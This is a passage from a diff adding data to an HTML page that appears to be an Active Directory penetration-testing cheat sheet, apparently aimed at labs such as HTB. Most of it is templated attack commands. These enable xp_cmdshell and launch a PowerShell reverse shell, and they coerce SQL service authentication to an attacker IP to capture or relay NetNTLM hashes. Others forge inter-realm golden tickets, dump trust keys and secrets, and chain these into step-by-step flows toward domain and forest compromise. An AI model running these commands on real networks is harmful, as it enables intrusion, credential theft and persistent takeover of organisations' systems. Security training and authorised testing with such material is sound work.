+],note:'<span class="mono">-windows-auth</span> for AD accounts, omit it for SQL logins. If SQL auth: <span class="mono">sa</span> + password. Inside the shell use <span class="mono">help</span>, <span class="mono">enable_xp_cmdshell</span>, <span class="mono">xp_cmdshell whoami</span>.'});
+
+R({id:'mssql-xpcmdshell',cat:'mssql',title:'xp_cmdshell — OS commands as the SQL service',desc:'Classic RCE through MSSQL (runs as the service account, often with SeImpersonate).',
+cmds:[
+ [`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`,'enable advanced options'],
+ [`EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`,'enable xp_cmdshell'],
+ [`EXEC xp_cmdshell 'whoami';`,'command exec'],
+ [`EXEC xp_cmdshell 'powershell -e <base64>';`,'PowerShell reverse shell'],
+ [`EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`,'CLEANUP: disable']
+],note:'Alternative without xp_cmdshell: OLE Automation (<span class="mono">sp_OACreate</span>) or agent jobs. If SeImpersonate shows up in <span class="mono">whoami /priv</span> for the SQL service account, chain a potato for SYSTEM.'});
+
+R({id:'mssql-impersonate',cat:'mssql',title:'MSSQL impersonation',desc:'Hop to sa or another login that has more rights.',
+cmds:[
+ [`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`,'find impersonable logins'],
+ [`SELECT SYSTEM_USER;`,'current login'],
+ [`EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;`,'impersonate sa'],
+ [`EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');`,'verify sysadmin'],
+ [`REVERT;`,'drop back']
+],note:'If you become <span class="mono">sysadmin</span> but xp_cmdshell is locked down, use OLE automation or <span class="mono">sp_configure</span> from the impersonated context.'});
+
+R({id:'mssql-linked',cat:'mssql',title:'MSSQL linked servers',desc:'Pivot through linked SQL servers, execute as their service accounts.',
+cmds:[
+ [`SELECT srvname, isremote FROM sysservers;`,'list linked servers'],
+ [`EXEC ('select @@version') AT [LINKEDSRV];`,'query through link'],
+ [`EXEC ('select system_user') AT [LINKEDSRV];`,'context on linked server'],
+ [`EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE;') AT [LINKEDSRV];`,'enable advanced remotely'],
+ [`EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKEDSRV];`,'RCE on linked server'],
+ [`EXEC sp_serveroption 'LINKEDSRV', 'rpc out', 'true';`,'enable RPC out if needed']
+],note:'Linked servers often use sysadmin context — this is a common lab path from a low-priv SQL login to DC compromise. Chain with UNC coercion: <span class="mono">EXEC xp_dirtree \'\\\\{{attacker_ip}}\\share\'</span> steals the service account NetNTLM.'});
+
+R({id:'mssql-coerce',cat:'mssql',title:'MSSQL — steal service account NetNTLM',desc:'Force the SQL service to authenticate to you, then crack or relay.',
+cmds:[
+ [`EXEC master..xp_dirtree '\\\\{{attacker_ip}}\\share';`,'SMB auth trigger (xp_dirtree)'],
+ [`sudo responder -I {{iface}} -wdv`,'capture the hash (attacker)','ns'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'or relay it to LDAP(S)','n'],
+ [`hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt {{wordlist}}`,'crack NetNTLMv2','n']
+],note:'On newer SQL Server, <span class="mono">xp_dirtree</span> outbound SMB may be restricted by the <span class="mono">OUTBOUND_NETWORK</span> policy. Alternatives: <span class="mono">xp_fileexist</span>, <span class="mono">xp_subdirs</span>.'});
+
+/* ===== TRUSTS ===== */
+R({id:'trust-enum',cat:'trust',title:'Enumerate domain trusts',desc:'Find parent/child/forest trusts before attacking them.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts --transitive`,'trust tree (bloodyAD)'],
+ [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
+ [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M enum_trusts`,'nxc module (version dependent)']
+],note:'Look for a parent (in a child domain) — that is where the SID-history / extra-sid golden ticket abuse applies. Child DCs also hold a machine-readable copy of the trust key.'});
+
+R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
+cmds:[
+ [`impacket-raiseChild '{{domain}}/{{user}}:{{password}}'`,'automated child→parent (impacket)'],
+ [`impacket-secretsdump -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump trust account key (name = NetBIOS + $)'],
+ [`impacket-secretsdump -k -no-pass -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'trust key via ccache'],
+ [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -spn krbtgt/{{parent_domain}} '{{target_user}}'`,'forge inter-realm golden (extra-sid = parent SID-519)'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb <PARENT_DC> -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the parent DC']
+],note:'Automated route: <span class="mono">raiseChild.py</span> dumps the trust key, forges the ticket and psexecs to the parent DC (force a host with <span class="mono">-target-exec &lt;parent-dc&gt;</span>). Manual route needs: child domain SID, trust key, parent domain SID + <span class="mono">-519</span> (Enterprise Admins RID), and SPN <span class="mono">krbtgt/&lt;parent.fqdn&gt;</span>. Compare with <span class="mono">thehacker.recipes</span> for your exact trust direction.'});
+
+/* ===== BLOODHOUND COLLECTION ===== */
+R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
+cmds:[
+ [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'password'],
+ [`bloodhound-python -u '{{user}}' --hashes ':{{nthash}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'NT hash'],
+ [`KRB5CCNAME={{ccache}} bloodhound-python -u '{{user}}' -k -no-pass -d {{domain}} -ns {{dc_ip}} -c All --zip`,'Kerberos ccache'],
+ [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c DCOnly --zip`,'DCOnly (fast, no sessions)']
+],note:'<span class="mono">-ns</span> = DNS server (the DC). Add <span class="mono">--dns-tcp</span> if UDP/53 is filtered. Import the generated zip into BloodHound CE via <b>Administration → File Ingest</b>.'});
+
+R({id:'bh-nxc',cat:'bh',title:'NetExec BloodHound collector',desc:'One-shot collection with your nxc context (supports ccache).',
+cmds:[
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --bloodhound -c All --dns-server {{dc_ip}}`,'password'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --bloodhound -c All --dns-server {{dc_ip}}`,'PtH'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --bloodhound -c All --dns-server {{dc_ip}}`,'ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path loot.zip`,'bloodyAD collector']
+],note:'Output zip lands in the current directory. Collection methods: <span class="mono">All</span>, <span class="mono">Group</span>, <span class="mono">Session</span>, <span class="mono">Trusts</span>, <span class="mono">ACL</span>, <span class="mono">ObjectProps</span>, <span class="mono">DCOnly</span>.'});
+
+/* @@RECIPES@@ */
+/* ===== WIZARD FLOWS ===== */
+FLOWS.push(
+{id:'creds',title:'I have valid credentials (user + password)',when:'A domain account with a known password — the most common starting point.',
+steps:[
+ {t:'Verify and enumerate',d:'Confirm where the creds work, then look at shares and users.',r:['auth-check','user-enum','shares']},
+ {t:'Collect BloodHound data',d:'Map the domain before picking a path.',r:['bh-python','bh-nxc']},
+ {t:'Hunt weak spots',d:'Roast service accounts and check what you can write.',r:['kerberoast','asrep','bloodyad-writable']},
+ {t:'Check ADCS',d:'Certificate services often give a shortcut to DA.',r:['adcs-find']},
+ {t:'Escalate via ACLs / services',d:'Depending on what BloodHound and get writable showed.',r:['dacl-enum','mssql-connect','dacl-genericall-user','dacl-genericall-computer']},
+ {t:'If admin: dump and move',d:'Local admin on a host → SAM/LSA/LSASS. Domain Admin → DCSync.',r:['lat-winrm','creds-sam-lsa','creds-dpapi','creds-dcsync']}
+]},
+{id:'hash',title:'I have an NT hash (pass-the-hash)',when:'Dumped a hash but could not / do not want to crack it.',
+steps:[
+ {t:'Check where the hash works',d:'Any NTLM-accepting service — SMB, WinRM, LDAP, MSSQL.',r:['pth-check']},
+ {t:'Get Kerberos tickets (overpass)',d:'Convert the hash into a TGT for Kerberos-only services.',r:['gettgt','ccache-usage']},
+ {t:'Execute',d:'Remote shell or command execution.',r:['lat-smb-exec','lat-impacket-exec','lat-winrm']},
+ {t:'Dump if admin',d:'Local secrets, then domain secrets if you landed on a DC / got DA.',r:['creds-sam-lsa','creds-dcsync']}
+]},
+{id:'aes',title:'I have an AES key or a ccache',when:'Machine/service account key or an existing Kerberos ticket.',
+steps:[
+ {t:'Set up Kerberos on Kali',d:'krb5.conf, /etc/hosts and a valid TGT — -k/-no-pass only works when this is in place.',r:['kerberos-auth']},
+ {t:'Validate the ticket',d:'Check the principal and that name resolution works.',r:['kerb-check','ccache-usage']},
+ {t:'Request more tickets',d:'S4U / service tickets with the key you hold.',r:['gettgt','getst']},
+ {t:'Collect BloodHound with the ticket',d:'Kerberos-only collection works even when NTLM is blocked.',r:['bh-nxc']},
+ {t:'Dump',d:'Use the ticket to read secrets.',r:['creds-sam-lsa','creds-dcsync']}
+]},
+{id:'keytab',title:'I found a keytab file',when:'Linux host or backup contains /etc/krb5.keytab (common on HTB).',
+steps:[
+ {t:'Extract the keys',d:'KeyTabExtract gives you NTLM + AES128/256 of the service account.',r:['keytab']},
+ {t:'Get a TGT',d:'Prefer AES256 if RC4 is disabled.',r:['gettgt']},
+ {t:'What may the machine account do?',d:'A keytab plus msDS-AllowedToDelegateTo is a full takeover path. Check the delegation target and the T2A4D flag (0x1000000). If the target SPN does not exist, redirect it onto the DC.',r:['deleg-enum','constrained-getst','spn-hijack-deleg']},
+ {t:'Use the ticket',d:'Export the ccache and authenticate. The Kerberos setup card covers krb5.conf and hosts entries.',r:['kerberos-auth','ccache-usage','getst']},
+ {t:'Dump and move',d:'Service accounts often have rights over specific targets.',r:['creds-sam-lsa','creds-dcsync']}
+]},
+{id:'rbcd',title:'I have write rights over a computer (RBCD)',when:'GenericAll / GenericWrite / WriteAccountRestrictions / WriteDACL on a computer object — the classic delegation attack.',
+steps:[
+ {t:'Enumerate delegation state',d:'Confirm the target and any existing delegation entries.',r:['deleg-enum','rbcd-read']},
+ {t:'Create your rogue machine account',d:'Check MachineAccountQuota; add the computer you will delegate from.',r:['rbcd-addcomputer']},
+ {t:'Grant RBCD to your machine',d:'Point msDS-AllowedToActOnBehalfOfOtherIdentity at your controlled account.',r:['rbcd-write','rbcd-bloodyad']},
+ {t:'Request the impersonation ticket',d:'Impersonate Administrator to cifs/HOST of the target.',r:['rbcd-getst']},
+ {t:'Use the ticket and dump',d:'Export ccache, verify, then SAM/LSA/DPAPI/NTDS.',r:['rbcd-use']},
+ {t:'Cleanup',d:'Flush RBCD and delete the rogue machine account.',r:['rbcd-bloodyad']}
+]},
+{id:'constrained',title:'I found constrained delegation',when:'An account has msDS-AllowedToDelegateTo — S4U2Proxy/Protocol Transition abuse.',
+steps:[
+ {t:'Enumerate the delegation',d:'Find which account may delegate to which service.',r:['deleg-enum']},
+ {t:'Abuse S4U',d:'Request a ticket as any user for the allowed service.',r:['constrained-getst']},
+ {t:'Target SPN missing or unreachable?',d:'Move the delegation SPN onto the DC with bloodyAD (needs write on the DC object), then request the ticket with -altservice HOST/DC.',r:['spn-hijack-deleg']},
+ {t:'Use the ticket',d:'Export and use the ccache (Kerberos env: see kerberos-auth), then dump.',r:['kerberos-auth','ccache-usage','creds-sam-lsa','creds-dcsync']}
+]},
+{id:'unconstrained',title:'I found unconstrained delegation (or a coerced DC)',when:'A host is trusted for delegation and you can make a machine authenticate to it.',
+steps:[
+ {t:'Confirm the host',d:'Unconstrained computers cache TGTs of authenticating users.',r:['deleg-enum']},
+ {t:'Coerce authentication',d:'Make the DC authenticate to the unconstrained host.',r:['relay-coerce','unconstrained-coerce']},
+ {t:'Steal the tickets',d:'Dump LSASS on the unconstrained host — DC machine TGT included.',r:['unconstrained-coerce','creds-sam-lsa']},
+ {t:'DCSync',d:'With the DC machine account you can replicate secrets.',r:['creds-dcsync']}
+]},
+{id:'adcs',title:'I found an ADCS vulnerability',when:'Certipy reported a vulnerable template or web enrollment (ESC1–ESC8+).',
+steps:[
+ {t:'Enumerate properly',d:'Get the full picture before requesting anything.',r:['adcs-find']},
+ {t:'Exploit the template',d:'ESC1 (supplied SAN) or ESC4 (make a template ESC1-able first).',r:['adcs-esc1','adcs-esc4']},
+ {t:'Relay to the CA',d:'ESC8 if web enrollment over HTTP is exposed.',r:['adcs-esc8','relay-coerce']},
+ {t:'Use the certificate',d:'certipy auth gives you the NT hash — then PtH or DCSync.',r:['creds-dcsync']}
+]},
+{id:'dacl',title:'I have rights over a user / group / computer',when:'GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf or AddKeyCredentialLink.',
+steps:[
+ {t:'Read the ACL and find write rights',d:'Confirm exactly which object/attribute you can write.',r:['dacl-enum','bloodyad-writable']},
+ {t:'User takeover',d:'Pick the least destructive option: shadow credentials, targeted kerberoast, password reset, group add.',r:['dacl-genericall-user','dacl-forcechangepassword','shadow-creds']},
+ {t:'Computer takeover',d:'Shadow credentials on the machine, or RBCD with a rogue computer.',r:['dacl-genericall-computer','rbcd-addcomputer','rbcd-write','rbcd-getst']},
+ {t:'Group takeover',d:'Add yourself to the group, then re-authenticate.',r:['dacl-genericall-group']},
+ {t:'Domain object (WriteDACL/Owner)',d:'Grant DCSync or take ownership first.',r:['dacl-writedacl-dcsync','dacl-writeowner']},
+ {t:'Cleanup',d:'Remove the ACEs, key credentials and group memberships you added.',r:['shadow-creds','dacl-genericall-group']}
+]},
+{id:'mssql',title:'I have MSSQL access',when:'A SQL login or Windows account reaches a MSSQL server.',
+steps:[
+ {t:'Connect',d:'Windows auth or SQL login; hash and Kerberos also supported.',r:['mssql-connect']},
+ {t:'Get OS command execution',d:'xp_cmdshell (or OLE automation if disabled).',r:['mssql-xpcmdshell']},
+ {t:'Escalate inside SQL',d:'Impersonate sa / sysadmin logins, pivot through linked servers.',r:['mssql-impersonate','mssql-linked']},
+ {t:'Steal the service account hash',d:'Coerce NTLM out and crack or relay it.',r:['mssql-coerce','relay-ldap','relay-smb']},
+ {t:'Loot local secrets',d:'The SQL service account often has local admin elsewhere — SPN + Kerberos helps.',r:['kerberoast','creds-sam-lsa']}
+]},
+{id:'nopwn',title:'No credentials — only network access',when:'Internal position, nothing but a Kali box attached to the network.',
+steps:[
+ {t:'Poison name resolution',d:'LLMNR/NBT-NS/mDNS — capture hashes from misconfigured clients.',r:['relay-responder']},
+ {t:'Enumerate anonymously',d:'Null sessions, SMB, DNS.',r:['anon-enum','user-enum']},
+ {t:'Coerce machine accounts',d:'Make DCs/services authenticate to your listener.',r:['relay-coerce']},
+ {t:'Relay the auth',d:'SMB → dump; LDAP(S) → DCSync rights; ADCS → certificate.',r:['relay-smb','relay-ldap','relay-rbcd','adcs-esc8']},
+ {t:'Crack captures',d:'NetNTLMv2 offline, then reuse passwords.',r:['relay-responder']}
+]},
+{id:'foothold',title:'I have a shell on a Windows host',when:'Foothold achieved — privilege escalation and lateral movement.',
+steps:[
+ {t:'Enumerate the host',d:'Who am I, what privileges, what is local.',r:['auth-check','pth-check']},
+ {t:'Privilege escalation',d:'SeImpersonate etc. → SYSTEM via potato.',r:['post-seimpersonate']},
+ {t:'Loot local secrets',d:'SAM/LSA/LSASS/DPAPI.',r:['creds-sam-lsa','creds-dpapi']},
+ {t:'Enable remote access',d:'RDP / firewall / file transfer.',r:['lat-rdp','rdp-auth','lat-transfer']},
+ {t:'Move laterally',d:'Reuse hashes and tickets on other hosts.',r:['lat-winrm','lat-smb-exec','lat-impacket-exec']}
+]},
+{id:'trusts',title:'There are domain trusts (child/parent/forest)',when:'BloodHound or enumeration shows a parent or sibling domain.',
+steps:[
+ {t:'Enumerate the trusts',d:'Understand direction and which domain you control.',r:['trust-enum']},
+ {t:'Abuse the trust',d:'Trust key extraction + inter-realm golden ticket, or raiseChild.',r:['trust-raisechild']},
+ {t:'Dump',d:'Once the parent DC accepts your ticket, DCSync it.',r:['creds-dcsync']}
+]},
+{id:'gpo',title:'I can modify a GPO or ADIDNS',when:'GenericWrite/WriteDACL on a GPO object, or AD-integrated DNS is writable.',
+steps:[
+ {t:'Find write rights',d:'Locate writable GPOs and GPP creds.',r:['post-gpo','bloodyad-writable']},
+ {t:'Push a task / hijack DNS',d:'Immediate scheduled task via GPO, or spoof names via DNS records.',r:['post-gpo','post-adidns']},
+ {t:'Catch the callbacks',d:'Coerce or poison to capture what the pushed config reaches for.',r:['relay-responder','relay-coerce']}
+]},
+{id:'da',title:'I am Domain Admin / I have the krbtgt hash',when:'Endgame: persistence and full forest compromise.',
+steps:[
+ {t:'Dump everything',d:'krbtgt + all hashes.',r:['creds-dcsync']},
+ {t:'Forge golden tickets',d:'Persistence that survives password resets.',r:['golden-ticket']},
+ {t:'Pivot to trusts',d:'Use trust keys and extra SIDs for parent/forest domains.',r:['trust-enum','trust-raisechild']},
+ {t:'Extract the rest',d:'Offline ntds parsing and local secrets.',r:['creds-ntds-offline']}
+]}
+);
+/* ===== BLOODHOUND CYPHER ===== */
+CYPHER.push(
+{t:'Shortest path from owned objects to Domain Admins',q:'MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@{{realm}}"})) RETURN p',n:'Mark your foothold with <b>Mark as Owned</b> (right-click). Group names are uppercase by convention: <span class="mono">{{realm}}</span> is rendered from your context.'},
+{t:'Kerberoastable users',q:'MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name, u.serviceprincipalnames',n:'Every account with an SPN — classic roast targets.'},
+{t:'Kerberoastable users with a path to DA',q:'MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@{{realm}}"})) RETURN p',n:'Roast these first — even a low-priv service account may own the path.'},
+{t:'AS-REP roastable users',q:'MATCH (u:User {dontreqpreauth:true}) RETURN u.name',n:'Kerberos pre-auth disabled — roastable without credentials.'},
+{t:'Unconstrained delegation computers',q:'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name',n:'Coerce a DC into authenticating to one of these and steal its TGT.'},
+{t:'Constrained delegation',q:'MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate',n:'S4U2Proxy targets — check which services can be impersonated.'},
+{t:'RBCD: who can act on behalf of computers',q:'MATCH p=(a)-[:AllowedToAct]->(c:Computer) RETURN p',n:'Resource-based constrained delegation edges (Edge: AllowedToAct).'},
+{t:'Write rights over computers (from owned)',q:'MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(c:Computer) RETURN p',n:'These are your RBCD / shadow-credentials candidates.'},
+{t:'Local admin (AdminTo) from owned',q:'MATCH p=(u {owned:true})-[:AdminTo]->(c:Computer) RETURN p',n:'Hosts where you can dump SAM/LSA right away.'},
+{t:'WinRM access (CanPSRemote) from owned',q:'MATCH p=(u {owned:true})-[:CanPSRemote]->(c:Computer) RETURN p',n:'PowerShell remoting paths.'},
+{t:'Active sessions of Domain Admins',q:'MATCH p=(c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@{{realm}}"})) RETURN p',n:'Compromise these hosts to steal admin credentials from LSASS.'},
+{t:'GPOs you can write to',q:'MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p',n:'GPO write access = code execution on every machine in scope.'},
+{t:'ADCS certificate templates with edges',q:'MATCH p=(u:User)-[:Enroll|GenericAll|WriteOwner|WriteDacl|Owns]->(t:CertTemplate) RETURN p',n:'BloodHound CE only (ADCS collector enabled). Combine with certipy findings.'},
+{t:'All owned objects',q:'MATCH (n {owned:true}) RETURN n',n:'Quick sanity check of what BloodHound knows you control.'},
+{t:'Domain trusts',q:'MATCH p=(d:Domain)-[:TrustedBy]->(d2:Domain) RETURN p',n:'Find parent/child and forest trust relationships.'},
+{t:'Foreign group members (cross-domain)',q:'MATCH p=(u:User)-[:MemberOf*1..]->(g:Group) WHERE NOT g.name ENDS WITH "@{{realm}}" RETURN p',n:'Accounts from other domains nested in your groups — a common trust abuse path.'}
+);
+
+initUI();
+</script>
+</body>
+</html>
